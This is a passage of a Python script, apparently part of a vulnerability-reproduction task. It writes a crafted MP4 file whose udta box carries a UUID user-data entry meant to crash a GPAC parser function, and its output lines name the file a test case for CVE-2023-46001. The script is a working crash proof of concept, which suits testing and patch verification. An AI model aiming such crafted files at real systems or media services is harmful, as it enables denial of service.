 dref_data = struct.pack(\'>I\', 1)  # entry_count\n    # url box (self-contained)\n    dref_data += write_fullbox(\'url \', 0, 1, b\'\')\n    dinf_content += write_fullbox(\'dref\', 0, 0, dref_data)\n    minf_content += write_box(\'dinf\', dinf_content)\n    \n    # Build stbl box\n    stbl_content = b\'\'\n    \n    # stsd - sample description\n    stsd_data = struct.pack(\'>I\', 1)  # entry_count\n    # avc1 visual sample entry\n    avc1_data = b\'\\x00\' * 6  # reserved\n    avc1_data += struct.pack(\'>H\', 1)  # data_reference_index\n    avc1_data += b\'\\x00\' * 16  # pre_defined, reserved\n    avc1_data += struct.pack(\'>HH\',\n        320,        # width\n        240         # height\n    )\n    avc1_data += struct.pack(\'>I\', 0x00480000)  # horizresolution\n    avc1_data += struct.pack(\'>I\', 0x00480000)  # vertresolution\n    avc1_data += struct.pack(\'>I\', 0)  # reserved\n    avc1_data += struct.pack(\'>H\', 1)  # frame_count\n    avc1_data += b\'\\x00\' * 32  # compressorname\n    avc1_data += struct.pack(\'>HH\', 0x0018, 0xffff)  # depth, pre_defined\n    \n    # avcC - AVC configuration (minimal valid)\n    avcc_data = struct.pack(\'>BBBBHB\',\n        1,          # configurationVersion\n        0x42,       # AVCProfileIndication (baseline)\n        0x00,       # profile_compatibility\n        0x1e,       # AVCLevelIndication\n        0xff,       # lengthSizeMinusOne (4 bytes)\n        0xe1        # numOfSequenceParameterSets (1)\n    )\n    avcc_data += struct.pack(\'>H\', 7)  # sequenceParameterSetLength\n    avcc_data += b\'\\x67\\x42\\x00\\x1e\\x8c\\x8d\\x40\'  # minimal SPS\n    avcc_data += struct.pack(\'>B\', 1)  # numOfPictureParameterSets\n    avcc_data += struct.pack(\'>H\', 4)  # pictureParameterSetLength\n    avcc_data += b\'\\x68\\xce\\x3c\\x80\'  # minimal PPS\n    \n    avc1_data += write_box(\'avcC\', avcc_data)\n    stsd_data += write_box(\'avc1\', avc1_data)\n    stbl_content += write_fullbox(\'stsd\', 0, 0, stsd_data)\n    \n    # stts - time to sample\n    stts_data = struct.pack(\'>I\', 1)  # entry_count\n    stts_data += struct.pack(\'>II\', 1, 1000)  # sample_count, sample_delta\n    stbl_content += write_fullbox(\'stts\', 0, 0, stts_data)\n    \n    # stsc - sample to chunk\n    stsc_data = struct.pack(\'>I\', 1)  # entry_count\n    stsc_data += struct.pack(\'>III\', 1, 1, 1)  # first_chunk, samples_per_chunk, sample_description_index\n    stbl_content += write_fullbox(\'stsc\', 0, 0, stsc_data)\n    \n    # stsz - sample size\n    stsz_data = struct.pack(\'>II\', 0, 1)  # sample_size, sample_count\n    stsz_data += struct.pack(\'>I\', 32)  # entry_size[0]\n    stbl_content += write_fullbox(\'stsz\', 0, 0, stsz_data)\n    \n    # stco - chunk offset\n    stco_data = struct.pack(\'>I\', 1)  # entry_count\n    stco_data += struct.pack(\'>I\', 40)  # chunk_offset[0] (offset to mdat data)\n    stbl_content += write_fullbox(\'stco\', 0, 0, stco_data)\n    \n    minf_content += write_box(\'stbl\', stbl_content)\n    mdia_content += write_box(\'minf\', minf_content)\n    trak_content += write_box(\'mdia\', mdia_content)\n    \n    # *** CRITICAL: Add udta box with UUID entry to trigger the vulnerability ***\n    udta_content = b\'\'\n    \n    # UUID userdata box - this will trigger the crash when gf_isom_get_user_data is called with UUID=NULL\n    uuid_usertype = b\'\\x12\\x34\\x56\\x78\' * 4  # 16-byte UUID\n    uuid_data = b\'trigger_crash_data\'\n    udta_content += write_box(\'uuid\', uuid_usertype + uuid_data)\n    \n    trak_content += write_box(\'udta\', udta_content)\n    \n    moov_content += write_box(\'trak\', trak_content)\n    \n    # Write moov box\n    f.write(write_box(\'moov\', moov_content))\n\nprint(f"Generated test case at: {output_path}")\nprint("File contains a valid MP4 with a track containing UUID userdata to trigger CVE-2023-46001")\n'}
